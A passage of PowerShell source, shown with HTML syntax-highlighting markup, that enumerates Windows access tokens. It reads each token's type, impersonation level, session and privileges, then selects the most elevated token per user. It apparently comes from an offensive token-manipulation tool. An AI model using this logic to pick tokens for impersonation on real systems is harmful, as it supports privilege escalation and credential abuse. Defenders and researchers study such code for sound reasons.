impersonation token</span>                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name TokenType <span class="token operator">-</span>Value <span class="token string">"UnableToRetrieve"</span>                    <span class="token namespace">[UInt32]</span><span class="token variable">$TokenTypeSize</span> = 4                    <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenTypePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenTypeSize</span><span class="token punctuation">)</span>                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenType<span class="token punctuation">,</span> <span class="token variable">$TokenTypePtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenTypeSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenType</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenTypePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>                        <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$TokenType</span><span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            1 <span class="token punctuation">{</span><span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>TokenType = <span class="token string">"Primary"</span><span class="token punctuation">}</span>                            2 <span class="token punctuation">{</span><span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>TokenType = <span class="token string">"Impersonation"</span><span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenTypePtr</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#Query the impersonation level if the token is an Impersonation token</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>TokenType <span class="token operator">-</span>ieq <span class="token string">"Impersonation"</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name ImpersonationLevel <span class="token operator">-</span>Value <span class="token string">"UnableToRetrieve"</span>                        <span class="token namespace">[UInt32]</span><span class="token variable">$ImpersonationLevelSize</span> = 4                        <span class="token namespace">[IntPtr]</span><span class="token variable">$ImpersonationLevelPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$ImpersonationLevelSize</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#sizeof uint32</span>                        <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0                        <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenImpersonationLevel<span class="token punctuation">,</span> <span class="token variable">$ImpersonationLevelPtr</span><span class="token punctuation">,</span> <span class="token variable">$ImpersonationLevelSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve TokenImpersonationLevel status. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">else</span>                        <span class="token punctuation">{</span>                            <span class="token namespace">[UInt32]</span><span class="token variable">$ImpersonationLevel</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$ImpersonationLevelPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>                            <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$ImpersonationLevel</span><span class="token punctuation">)</span>                            <span class="token punctuation">{</span>                                0 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityAnonymous"</span> <span class="token punctuation">}</span>                                1 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityIdentification"</span> <span class="token punctuation">}</span>                                2 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityImpersonation"</span> <span class="token punctuation">}</span>                                3 <span class="token punctuation">{</span> <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>ImpersonationLevel = <span class="token string">"SecurityDelegation"</span> <span class="token punctuation">}</span>                            <span class="token punctuation">}</span>                        <span class="token punctuation">}</span>                        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$ImpersonationLevelPtr</span><span class="token punctuation">)</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">#Query the token sessionid</span>                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name SessionID <span class="token operator">-</span>Value <span class="token string">"Unknown"</span>                    <span class="token namespace">[UInt32]</span><span class="token variable">$TokenSessionIdSize</span> = 4                    <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenSessionIdPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenSessionIdSize</span><span class="token punctuation">)</span>                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenSessionId<span class="token punctuation">,</span> <span class="token variable">$TokenSessionIdPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenSessionIdSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve Token SessionId. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        <span class="token namespace">[UInt32]</span><span class="token variable">$TokenSessionId</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenSessionIdPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token namespace">[UInt32]</span><span class="token punctuation">)</span>                        <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>SessionID = <span class="token variable">$TokenSessionId</span>                    <span class="token punctuation">}</span>                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenSessionIdPtr</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#Query the token privileges</span>                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name PrivilegesEnabled <span class="token operator">-</span>Value @<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token variable">$ReturnObj</span> <span class="token punctuation">|</span> <span class="token function">Add-Member</span> <span class="token operator">-</span><span class="token function">Type</span> NoteProperty <span class="token operator">-</span>Name PrivilegesAvailable <span class="token operator">-</span>Value @<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token namespace">[UInt32]</span><span class="token variable">$TokenPrivilegesSize</span> = 1000                    <span class="token namespace">[IntPtr]</span><span class="token variable">$TokenPrivilegesPtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesSize</span><span class="token punctuation">)</span>                    <span class="token namespace">[UInt32]</span><span class="token variable">$RealSize</span> = 0                    <span class="token variable">$Success</span> = <span class="token variable">$GetTokenInformation</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$hToken</span><span class="token punctuation">,</span> <span class="token variable">$TOKEN_INFORMATION_CLASS</span>::TokenPrivileges<span class="token punctuation">,</span> <span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token variable">$TokenPrivilegesSize</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$RealSize</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                        <span class="token function">Write-Warning</span> <span class="token string">"GetTokenInformation failed to retrieve Token SessionId. ErrorCode: <span class="token variable">$ErrorCode</span>"</span>                    <span class="token punctuation">}</span>                    <span class="token keyword">else</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$TokenPrivileges</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">)</span>                        <span class="token comment" spellcheck="true">#Loop through each privilege</span>                        <span class="token namespace">[IntPtr]</span><span class="token variable">$PrivilegesBasePtr</span> = <span class="token namespace">[IntPtr]</span><span class="token punctuation">(</span>Add<span class="token operator">-</span>SignedIntAsUnsigned <span class="token variable">$TokenPrivilegesPtr</span> <span class="token punctuation">(</span><span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::OffsetOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$TOKEN_PRIVILEGES</span><span class="token punctuation">,</span> <span class="token string">"Privileges"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token variable">$LuidAndAttributeSize</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::SizeOf<span class="token punctuation">(</span><span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>                        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> = 0<span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">-lt</span> <span class="token variable">$TokenPrivileges</span><span class="token punctuation">.</span>PrivilegeCount<span class="token punctuation">;</span> <span class="token variable">$i</span>+<span class="token operator">+</span><span class="token punctuation">)</span>                        <span class="token punctuation">{</span>                            <span class="token variable">$LuidAndAttributePtr</span> = <span class="token namespace">[IntPtr]</span><span class="token punctuation">(</span>Add<span class="token operator">-</span>SignedIntAsUnsigned <span class="token variable">$PrivilegesBasePtr</span> <span class="token punctuation">(</span><span class="token variable">$LuidAndAttributeSize</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                            <span class="token variable">$LuidAndAttribute</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStructure<span class="token punctuation">(</span><span class="token variable">$LuidAndAttributePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Type]</span><span class="token variable">$LUID_AND_ATTRIBUTES</span><span class="token punctuation">)</span>                            <span class="token comment" spellcheck="true">#Lookup privilege name</span>                            <span class="token namespace">[UInt32]</span><span class="token variable">$PrivilegeNameSize</span> = 60                            <span class="token variable">$PrivilegeNamePtr</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::AllocHGlobal<span class="token punctuation">(</span><span class="token variable">$PrivilegeNameSize</span><span class="token punctuation">)</span>                            <span class="token variable">$PLuid</span> = <span class="token variable">$LuidAndAttributePtr</span> <span class="token comment" spellcheck="true">#The Luid structure is the first object in the LuidAndAttributes structure, so a ptr to LuidAndAttributes also points to Luid</span>                            <span class="token variable">$Success</span> = <span class="token variable">$LookupPrivilegeNameW</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token namespace">[IntPtr]</span>::Zero<span class="token punctuation">,</span> <span class="token variable">$PLuid</span><span class="token punctuation">,</span> <span class="token variable">$PrivilegeNamePtr</span><span class="token punctuation">,</span> <span class="token namespace">[Ref]</span><span class="token variable">$PrivilegeNameSize</span><span class="token punctuation">)</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$Success</span><span class="token punctuation">)</span>                            <span class="token punctuation">{</span>                                <span class="token variable">$ErrorCode</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::GetLastWin32Error<span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token function">Write-Warning</span> <span class="token string">"Call to LookupPrivilegeNameW failed. Error code: <span class="token variable">$ErrorCode</span>. RealSize: <span class="token variable">$PrivilegeNameSize</span>"</span>                            <span class="token punctuation">}</span>                            <span class="token variable">$PrivilegeName</span> = <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::PtrToStringUni<span class="token punctuation">(</span><span class="token variable">$PrivilegeNamePtr</span><span class="token punctuation">)</span>                            <span class="token comment" spellcheck="true">#Get the privilege attributes</span>                            <span class="token variable">$PrivilegeStatus</span> = <span class="token string">""</span>                            <span class="token variable">$Enabled</span> = <span class="token boolean">$false</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-eq</span> 0<span class="token punctuation">)</span>                            <span class="token punctuation">{</span>                                <span class="token variable">$Enabled</span> = <span class="token boolean">$false</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-band</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED_BY_DEFAULT<span class="token punctuation">)</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED_BY_DEFAULT<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#enabled by default</span>                            <span class="token punctuation">{</span>                                <span class="token variable">$Enabled</span> = <span class="token boolean">$true</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-band</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED<span class="token punctuation">)</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_ENABLED<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#enabled</span>                            <span class="token punctuation">{</span>                                <span class="token variable">$Enabled</span> = <span class="token boolean">$true</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$LuidAndAttribute</span><span class="token punctuation">.</span>Attributes <span class="token operator">-band</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_REMOVED<span class="token punctuation">)</span> <span class="token operator">-eq</span> <span class="token variable">$Win32Constants</span><span class="token punctuation">.</span>SE_PRIVILEGE_REMOVED<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#SE_PRIVILEGE_REMOVED. This should never exist. Write a warning if it is found so I can investigate why/how it was found.</span>                            <span class="token punctuation">{</span>                                <span class="token function">Write-Warning</span> <span class="token string">"Unexpected behavior: Found a token with SE_PRIVILEGE_REMOVED. Please report this as a bug. "</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Enabled</span><span class="token punctuation">)</span>                            <span class="token punctuation">{</span>                                <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>PrivilegesEnabled <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$PrivilegeName</span>                            <span class="token punctuation">}</span>                            <span class="token keyword">else</span>                            <span class="token punctuation">{</span>                                <span class="token variable">$ReturnObj</span><span class="token punctuation">.</span>PrivilegesAvailable <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$PrivilegeName</span>                            <span class="token punctuation">}</span>                            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$PrivilegeNamePtr</span><span class="token punctuation">)</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                    <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenPrivilegesPtr</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Verbose</span> <span class="token string">"Call to LsaGetLogonSessionData succeeded. This SHOULD be SYSTEM since there is no data.<span class="token function"> $<span class="token punctuation">(</span><span class="token variable">$LogonSessionData</span><span class="token punctuation">.</span>UserName<span class="token punctuation">.</span>Length<span class="token punctuation">)</span></span>"</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">#Free LogonSessionData</span>                <span class="token variable">$ntstatus</span> = <span class="token variable">$LsaFreeReturnBuffer</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span><span class="token variable">$LogonSessionDataPtr</span><span class="token punctuation">)</span>                <span class="token variable">$LogonSessionDataPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$ntstatus</span> <span class="token operator">-ne</span> 0<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token function">Write-Warning</span> <span class="token string">"Call to LsaFreeReturnBuffer failed. Error code: <span class="token variable">$ntstatus</span>"</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$LuidPtr</span><span class="token punctuation">)</span>            <span class="token variable">$LuidPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token punctuation">}</span>        <span class="token namespace">[System.Runtime.InteropServices.Marshal]</span>::FreeHGlobal<span class="token punctuation">(</span><span class="token variable">$TokenStatsPtr</span><span class="token punctuation">)</span>        <span class="token variable">$TokenStatsPtr</span> = <span class="token namespace">[IntPtr]</span>::Zero        <span class="token keyword">return</span> <span class="token variable">$ReturnObj</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">#Takes an array of TokenObjects built by the script and returns the unique ones</span>    <span class="token keyword">function</span> Get<span class="token operator">-</span>UniqueTokens    <span class="token punctuation">{</span>        <span class="token keyword">Param</span><span class="token punctuation">(</span>            <span class="token namespace">[Parameter(Position=0, Mandatory=$true)]</span>            <span class="token namespace">[Object[]</span><span class="token punctuation">]</span>            <span class="token variable">$AllTokens</span>        <span class="token punctuation">)</span>        <span class="token variable">$TokenByUser</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token variable">$TokenByEnabledPriv</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token variable">$TokenByAvailablePriv</span> = @<span class="token punctuation">{</span><span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#Filter tokens by user</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$Key</span> = <span class="token variable">$Token</span><span class="token punctuation">.</span>Domain <span class="token operator">+</span> <span class="token string">"\"</span> <span class="token operator">+</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>Username            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-not</span> <span class="token variable">$TokenByUser</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Key</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">#Filter out network logons and junk Windows accounts. This filter eliminates accounts which won't have creds because</span>                <span class="token comment" spellcheck="true">#    they are network logons (type 3) or logons for which the creds don't matter like LOCOAL SERVICE, DWM, etc..</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>LogonType <span class="token operator">-ne</span> 3 <span class="token operator">-and</span>                    <span class="token variable">$Token</span><span class="token punctuation">.</span>Username <span class="token operator">-</span>inotmatch <span class="token string">"^DWM-\d+$"</span> <span class="token operator">-and</span>                    <span class="token variable">$Token</span><span class="token punctuation">.</span>Username <span class="token operator">-</span>inotmatch <span class="token string">"^LOCAL\sSERVICE$"</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token variable">$TokenByUser</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token variable">$Key</span><span class="token punctuation">,</span> <span class="token variable">$Token</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">#If Tokens have equal elevation levels, compare their privileges.</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>IsElevated <span class="token operator">-eq</span> <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>IsElevated<span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesEnabled<span class="token punctuation">.</span>Count <span class="token operator">+</span> <span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesAvailable<span class="token punctuation">.</span>Count<span class="token punctuation">)</span> <span class="token operator">-gt</span> <span class="token punctuation">(</span><span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PrivilegesEnabled<span class="token punctuation">.</span>Count <span class="token operator">+</span> <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>PrivilegesAvailable<span class="token punctuation">.</span>Count<span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span> = <span class="token variable">$Token</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">#If the new token is elevated and the current token isn't, use the new token</span>                <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>IsElevated <span class="token operator">-eq</span> <span class="token boolean">$true</span><span class="token punctuation">)</span> <span class="token operator">-and</span> <span class="token punctuation">(</span><span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span><span class="token punctuation">.</span>IsElevated <span class="token operator">-eq</span> <span class="token boolean">$false</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token variable">$TokenByUser</span><span class="token punctuation">[</span><span class="token variable">$Key</span><span class="token punctuation">]</span> = <span class="token variable">$Token</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#Filter tokens by privilege</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Token</span> in <span class="token variable">$AllTokens</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$Fullname</span> = <span class="token string"><span class="token function">"$<span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>Domain<span class="token punctuation">)</span></span><span class="token function">\$<span class="token punctuation">(</span><span class="token variable">$Token</span><span class="token punctuation">.</span>Username<span class="token punctuation">)</span></span>"</span>            <span class="token comment" spellcheck="true">#Filter currently enabled privileges</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Privilege</span> in <span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesEnabled<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">-notcontains</span> <span class="token variable">$Fullname</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$Fullname</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token variable">$TokenByEnabledPriv</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token variable">$Fullname</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">#Filter currently available (but not enable) privileges</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$Privilege</span> in <span class="token variable">$Token</span><span class="token punctuation">.</span>PrivilegesAvailable<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">.</span>ContainsKey<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">-notcontains</span> <span class="token variable">$Fullname</span><span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">[</span><span class="token variable">$Privilege</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token punctuation">,</span><span class="token variable">$Fullname</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">else</span>                <span class="token punctuation">{</span>                    <span class="token variable">$TokenByAvailablePriv</span><span class="token punctuation">.</span>Add<span class="token punctuation">(</span><span class="token variable">$Privilege</span><span class="token punctuation">,</span> @<span class="token punctuation">(</span><span class="token variable">$Fullname</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$ReturnDict</span> = @<span class="token punctuation">{</span>            TokenByUser = <span class="token variable">$TokenByUser</span>            TokenByEnabledPriv = <span class="token variable">$TokenByEnabledPriv</span>            